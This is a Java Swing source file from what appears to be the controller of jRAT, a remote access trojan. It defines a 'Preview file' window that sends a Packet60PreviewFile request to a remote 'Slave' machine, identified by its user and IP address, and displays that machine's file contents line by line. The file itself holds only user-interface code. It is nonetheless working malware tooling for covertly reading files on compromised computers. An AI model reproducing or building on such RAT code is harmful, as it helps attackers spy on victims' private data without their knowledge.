package se.jrat.controller.ui.frames;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;

import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet60PreviewFile;
import se.jrat.controller.utils.IconUtils;


@SuppressWarnings("serial")
public class FramePreviewFile extends BaseFrame {

	private JPanel contentPane;
	private String file;
	private int line = 0;
	private JTextPane textPane;
	public static final HashMap<String, FramePreviewFile> instances = new HashMap<String, FramePreviewFile>();
	private JButton btnClearreset;

	public JTextPane getPane() {
		return textPane;
	}

	public FramePreviewFile(Slave slave, String f) {
		super();
		final Slave sl = slave;
		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePreviewFile.class.getResource("/icons/file.png")));
		setTitle("Preview file - " + "[" + slave.formatUserString() + "] - " + slave.getIP() + " - " + f);
		this.file = f;
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		instances.put(file, this);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 543, 417);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReadMore = new JButton("Read more");
		btnReadMore.setIcon(IconUtils.getIcon("transfer"));
		btnReadMore.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sl.addToSendQueue(new Packet60PreviewFile(file, line++));
			}
		});

		btnClearreset = new JButton("Clear/Reset");
		btnClearreset.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				textPane.setText("");
				line = 0;
			}
		});
		btnClearreset.setIcon(IconUtils.getIcon("clear"));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 516, Short.MAX_VALUE).addGroup(gl_contentPane.createSequentialGroup().addComponent(btnReadMore).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClearreset))).addGap(1)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 336, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReadMore).addComponent(btnClearreset)).addGap(4)));

		textPane = new JTextPane();
		scrollPane.setViewportView(textPane);
		contentPane.setLayout(gl_contentPane);
	}

	public void exit() {
		instances.remove(file);
	}

}
